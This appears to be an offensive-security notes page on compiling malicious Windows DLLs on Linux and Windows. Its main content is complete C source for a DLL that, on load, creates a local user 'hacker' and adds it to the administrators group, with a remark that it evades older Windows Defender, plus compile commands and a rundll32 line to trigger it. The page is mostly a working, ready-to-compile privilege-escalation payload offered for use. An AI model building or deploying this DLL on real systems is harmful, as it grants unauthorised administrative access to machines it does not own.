# Creating a DLL in Linux

The code below currently does not get detected by older Windows Defender

```c
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd.exe /c net user hacker hacked /add");
    system("cmd.exe /c net localgroup administrators hacker /add");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Saved as `adduser.c`

Compile: `x86_64-w64-mingw32-gcc adduser.c -shared -o adduser.dll`

# Creating a DLL in Windows

1. Install Visual Studio Community Edition (whichever year, I used 2019)

2. From the start menu, run `x64 Native Tools Command Prompt for VS 2019`

3. Create your .c file in a folder somewhere writable

4. Compile the file with:

   ```vim
   cl.exe /LD <files-to-compile>
   ```

   or, if you prefer the more verbose & explicit version:

   ```jboss-cli
   cl.exe /D_USRDLL /D_WINDLL <files-to-compile> <files-to-link> /link /DLL /OUT:<desired-dll-name>.dll
   ```

5. Copy your DLL and enjoy

# Testing a DLL

Open a command prompt in Windows and run this:

```powershell
# Specify the function to run from within the DLL
# You can use Process Explorer to find the functions if you're not sure of it
# If there's no defined functions, just specify `Entry`
rundll32 yourDLL.dll, Entry
```

